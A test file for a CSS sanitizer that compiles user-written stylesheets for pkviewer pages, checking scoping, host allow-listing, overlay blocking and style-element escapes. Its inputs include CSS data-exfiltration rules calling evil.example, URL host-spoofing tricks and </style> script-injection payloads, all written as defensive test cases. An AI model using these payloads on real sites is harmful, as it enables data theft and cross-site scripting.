import { describe, expect, test } from "bun:test";
import { CSS_SCOPE, CSS_URL_HOSTS, MAX_CSS_LENGTH, sanitizeCss } from "../src/css/sanitize.ts";

/**
 * Custom CSS is the feature the decision log said not to switch on casually.
 *
 * pkviewer serves public pages and the management UI from one origin, so a
 * stylesheet somebody else wrote runs beside the session cookie. These tests
 * are the compiler's contract: what reaches a page is what pkviewer emitted,
 * not what an author typed.
 *
 * Each block below is an attack the one-origin decision recorded as the cost of
 * consolidating. If one of these starts passing input through, that decision
 * has quietly been reversed.
 */

const compile = (css: string) => sanitizeCss(css);

describe("nothing escapes the content area", () => {
  test("every selector is rewritten under the scope", () => {
    const out = compile("h1 { color: #fff }");
    expect(out.css).toContain(`${CSS_SCOPE} h1`);
    expect(out.kept).toBe(1);
  });

  test("a selector list is scoped part by part", () => {
    const out = compile("h1, .card { color: #fff }");
    expect(out.css).toContain(`${CSS_SCOPE} h1, ${CSS_SCOPE} .card`);
  });

  // Scoping by prefix would otherwise turn `body` into `#pkv-user body`, which
  // matches nothing — harmless — but `html` and `:root` are where a page-wide
  // background or font would be set, and authors will try. Refusing says so.
  test("page-level selectors are refused rather than silently doing nothing", () => {
    for (const selector of ["html", "body", ":root", "body .card", "html > *"]) {
      const out = compile(`${selector} { color: #fff }`);
      expect(out.kept, selector).toBe(0);
      expect(out.issues[0]?.kind, selector).toBe("selector_not_allowed");
    }
  });

  test("rules inside a media query are scoped too", () => {
    const out = compile("@media (min-width: 40em) { h1 { color: #fff } }");
    expect(out.css).toContain("@media (min-width: 40em)");
    expect(out.css).toContain(`${CSS_SCOPE} h1`);
    expect(out.kept).toBe(1);
  });

  test("a selector already naming the scope is not doubled", () => {
    const out = compile(`${CSS_SCOPE} h1 { color: #fff }`);
    expect(out.css.match(/#pkv-user/g)).toHaveLength(1);
  });
});

describe("a stylesheet reaches allow-listed hosts and nowhere else", () => {
  /**
   * `url()` is how CSS exfiltrates: an attribute selector plus a background
   * image reports what it matched, one request per guess. Host allow-listing is
   * what makes it safe to permit at all — the technique still works, but the
   * request can only arrive somewhere the author cannot read.
   *
   * Every case below is a way of looking like an allowed host without being
   * one, which is where host checks usually fail.
   */
  test("a URL on any other host is refused", () => {
    for (const url of [
      "https://evil.example/x",
      // Suffix, not the host.
      "https://fonts.googleapis.com.evil.example/x",
      // Userinfo, not the host — the browser reads this as evil.example.
      "https://fonts.googleapis.com@evil.example/x",
      // Protocol-relative: whose host this is depends on the page.
      "//fonts.gstatic.com/x",
      // Right host, wrong scheme.
      "http://m.doughmination.gay/x",
      "data:text/css,x",
    ]) {
      const out = compile(`.a { background-image: url(${url}) }`);
      expect(out.kept, url).toBe(0);
      expect(out.issues[0]?.kind, url).toBe("url_not_allowed");
    }
  });

  test("the allow-listed hosts work", () => {
    for (const host of CSS_URL_HOSTS) {
      const out = compile(`.a { background-image: url(https://${host}/x.png) }`);
      expect(out.kept, host).toBe(1);
    }
  });

  test("a URL hidden in a shorthand is checked too", () => {
    const out = compile(".a { background: #000 url(https://evil.example/x) no-repeat }");
    expect(out.kept).toBe(0);
  });

  test("legacy resource loaders stay refused", () => {
    expect(compile(".a { background-image: image-set('https://evil.example/x') }").kept).toBe(0);
  });

  /**
   * `@import` is the one thing pkviewer serves without compiling, so it is
   * locked to the single host that exists to return font stylesheets — not to
   * the whole allow-list, since the CDN serves arbitrary files and importing
   * one would smuggle in rules that never met the compiler.
   */
  test("@import works for Google Fonts and nothing else", () => {
    expect(compile(`@import url("https://fonts.googleapis.com/css2?family=Inter");`).kept).toBe(1);
    for (const url of [
      "https://m.doughmination.gay/x.css",
      "https://fonts.gstatic.com/x.css",
      "https://evil.example/x.css",
    ]) {
      const out = compile(`@import url("${url}");`);
      expect(out.kept, url).toBe(0);
      expect(out.issues[0]?.kind, url).toBe("url_not_allowed");
    }
  });

  // A statement at-rule ends at a semicolon. Reading ahead to the next brace
  // instead would swallow the rule after it.
  test("a refused @import does not consume the rule after it", () => {
    const out = compile(`@import url("https://evil.example/x.css");\n.a { color: #fff }`);
    expect(out.css).toContain("color: #fff");
    expect(out.css).not.toContain("evil.example");
  });

  test("@font-face loads from allow-listed hosts only", () => {
    const good = compile(
      `@font-face { font-family: X; src: url(https://fonts.gstatic.com/s/x.woff2) format("woff2") }`,
    );
    expect(good.kept).toBe(2);
    expect(good.css).toContain("@font-face");

    // A face whose src was refused has nothing to load, so the whole block goes
    // rather than naming a family it cannot supply.
    const bad = compile("@font-face { font-family: X; src: url(https://evil.example/x.woff2) }");
    expect(bad.css).toBe("");
  });

  test("@font-face takes descriptors, not arbitrary properties", () => {
    const out = compile(
      "@font-face { font-family: X; src: url(https://fonts.gstatic.com/x.woff2); position: fixed; color: red }",
    );
    expect(out.css).not.toContain("position");
    expect(out.css).not.toContain("color");
    expect(out.issues.filter((i) => i.kind === "property_not_allowed")).toHaveLength(2);
  });

  // The classic recipe. The selector is still expressible; the request is not.
  test("attribute-selector exfiltration has nowhere to send anything", () => {
    const out = compile(`input[value^="a"] { background-image: url(https://evil.example/a) }`);
    expect(out.kept).toBe(0);
  });
});

describe("nothing can be laid over the page", () => {
  /**
   * A fake sign-in prompt is far more convincing on an origin that genuinely
   * serves /login. Removing an element from the flow is what makes that
   * possible, so position is limited to what cannot.
   */
  test("fixed, absolute and sticky positioning are refused", () => {
    for (const value of ["fixed", "absolute", "sticky", "FIXED"]) {
      const out = compile(`.a { position: ${value} }`);
      expect(out.kept, value).toBe(0);
      expect(out.issues[0]?.kind, value).toBe("value_not_allowed");
    }
  });

  test("static and relative are allowed", () => {
    expect(compile(".a { position: relative }").kept).toBe(1);
    expect(compile(".a { position: static }").kept).toBe(1);
  });
});

describe("what pkviewer says about a system is not the system's to edit", () => {
  test("selectors naming a badge are refused", () => {
    for (const selector of [".pkvb", "a.pkvb", ".pkvb-row li", "ul .pkvb[data-tone]"]) {
      const out = compile(`${selector} { color: #fff }`);
      expect(out.kept, selector).toBe(0);
      expect(out.issues[0]?.kind, selector).toBe("protected_selector");
    }
  });

  test("selectors naming the third-party notice are refused", () => {
    for (const selector of [".site-footer", ".site-footer-links a"]) {
      const out = compile(`${selector} { display: none }`);
      expect(out.kept, selector).toBe(0);
      expect(out.issues[0]?.kind, selector).toBe("protected_selector");
    }
  });

  /**
   * Naming them is only half of it. `#pkv-user * { display: none }` reaches a
   * badge without ever spelling its class, so the stylesheet marks those rules
   * !important — and that only holds while authors cannot use !important
   * themselves.
   */
  test("!important is refused, because the protections rely on it", () => {
    const out = compile(".a { color: #fff !important }");
    expect(out.kept).toBe(0);
    expect(out.issues[0]?.kind).toBe("important_not_allowed");
  });

  test("a wildcard rule still compiles, and cannot outrank the protections", () => {
    const out = compile("* { display: none }");
    expect(out.kept).toBe(1);
    expect(out.css).not.toContain("!important");
  });
});

/**
 * The compiled text lands inside a <style> element, so `</style>` ends the
 * stylesheet and starts markup. Both of these shipped as written and were
 * caught by writing down the claim that they could not happen.
 */
describe("nothing escapes the style element", () => {
  test("a declaration value cannot close the element", () => {
    const out = compile(".a { width: </style><img src=x onerror=alert(1)> }");
    expect(out.kept).toBe(0);
    expect(out.css).toBe("");
  });

  test("an at-rule prelude cannot close the element", () => {
    const out = compile("@media </style><script>alert(1)</script> { .a { color: red } }");
    expect(out.kept).toBe(0);
    expect(out.css).toBe("");
  });

  // The prelude is emitted verbatim, so it needs a positive character class of
  // its own rather than the declaration checks.
  test("an ordinary media prelude still compiles", () => {
    const out = compile("@media screen and (min-width: 40em) { .a { color: red } }");
    expect(out.kept).toBe(1);
    expect(out.css).toContain("@media screen and (min-width: 40em)");
  });

  test("no angle bracket reaches the output from any input", () => {
    const attempts = [
      ".a { color: red } </style>",
      ".a</style> { color: red }",
      "@supports (a: b) { .a { content: </style> } }",
      ".a { font-family: \"</style>\" }",
      "@media (min-width: 1px) { .a { width: <1px> } }",
    ];
    for (const css of attempts) {
      expect(compile(css).css, css).not.toContain("<");
      expect(compile(css).css, css).not.toContain(">");
    }
  });
});

describe("only known properties survive", () => {
  test("an unknown property is dropped and reported", () => {
    const out = compile(".a { color: #fff; -moz-binding: x; behavior: y }");
    expect(out.kept).toBe(1);
    expect(out.css).toContain("color: #fff");
    expect(out.issues.map((i) => i.kind)).toEqual(["property_not_allowed", "property_not_allowed"]);
  });

  test("legacy script-execution values are refused even on allowed properties", () => {
    for (const value of ["expression(alert(1))", "javascript:alert(1)"]) {
      expect(compile(`.a { width: ${value} }`).kept, value).toBe(0);
    }
  });

  // A backslash escape can spell a forbidden token past a substring check.
  test("escaped characters are refused rather than decoded", () => {
    expect(compile(".a { color: \\75 rl(//evil.example/x) }").kept).toBe(0);
  });
});

describe("a mistake costs one rule, not the stylesheet", () => {
  test("valid rules survive alongside rejected ones", () => {
    const out = compile(`
      .card { color: #fff; position: fixed }
      .name { font-weight: 700 }
    `);
    expect(out.kept).toBe(2);
    expect(out.css).toContain("font-weight: 700");
    expect(out.issues).toHaveLength(1);
  });

  test("issues carry the line the author typed on", () => {
    const out = compile("\n\n.a { position: fixed }");
    expect(out.issues[0]?.line).toBe(3);
  });

  /**
   * Line numbers are the whole usability story of the editor: a rule that was
   * dropped looks identical to a rule that did nothing, and the number is what
   * tells them apart. Two off-by-ones lived here — a rule reported the line the
   * PREVIOUS rule closed on, and every declaration after the first in a block
   * was measured from the wrong start.
   */
  test("each rule reports its own line, not the previous one's", () => {
    const out = compile(
      [
        ".ok { color: #fff }",
        ".a { position: fixed }",
        ".pkvb { display: none }",
        "body { color: red }",
        ".b { color: #fff !important }",
      ].join("\n"),
    );
    expect(out.issues.map((i) => i.line)).toEqual([2, 3, 4, 5]);
  });

  test("every declaration in a block reports its own line", () => {
    const out = compile(".a {\n  color: #fff;\n  position: fixed;\n  zoom: 2;\n}");
    expect(out.issues.map((i) => [i.line, i.kind])).toEqual([
      [3, "value_not_allowed"],
      [4, "property_not_allowed"],
    ]);
  });

  test("issues inside a media query report the author's line", () => {
    const out = compile("\n@media (min-width: 40em) {\n  .a { position: fixed }\n}");
    expect(out.issues[0]?.line).toBe(3);
  });

  test("comments do not shift line numbers", () => {
    const out = compile("/* a\n   comment */\n.a { position: fixed }");
    expect(out.issues[0]?.line).toBe(3);
  });

  test("an unterminated rule does not throw", () => {
    expect(() => compile(".a { color: #fff")).not.toThrow();
    expect(() => compile("}{}{")).not.toThrow();
    expect(() => compile("@media {")).not.toThrow();
  });

  test("empty input compiles to nothing", () => {
    expect(compile("").css).toBe("");
    expect(compile("   ").kept).toBe(0);
    expect(sanitizeCss(null).kept).toBe(0);
    expect(sanitizeCss(42).kept).toBe(0);
  });

  test("an oversized stylesheet is refused whole", () => {
    const out = compile(`.a { color: #fff }`.repeat(2000));
    expect(out.kept).toBe(0);
    expect(out.issues[0]?.kind).toBe("too_long");
    expect(MAX_CSS_LENGTH).toBeGreaterThan(1000);
  });
});

describe("ordinary styling still works", () => {
  test("a realistic stylesheet compiles intact", () => {
    const out = compile(`
      .card {
        background-color: #1b1520;
        border-radius: 14px;
        padding: 1.25rem;
        box-shadow: 0 2px 8px rgba(0,0,0,0.25);
      }
      .card:hover { border-color: #f58fc2 }
      h1, h2 { letter-spacing: -0.01em; text-transform: uppercase }
      @media (prefers-color-scheme: dark) {
        .card { background-color: #100c14 }
      }
    `);
    expect(out.issues).toEqual([]);
    expect(out.kept).toBe(8);
  });

  // The token vocabulary is the supported way to restyle a page, so reading a
  // var() must keep working inside custom CSS.
  test("theme custom properties can be read", () => {
    const out = compile(".card { color: var(--pkv-color-accent) }");
    expect(out.kept).toBe(1);
    expect(out.css).toContain("var(--pkv-color-accent)");
  });
});
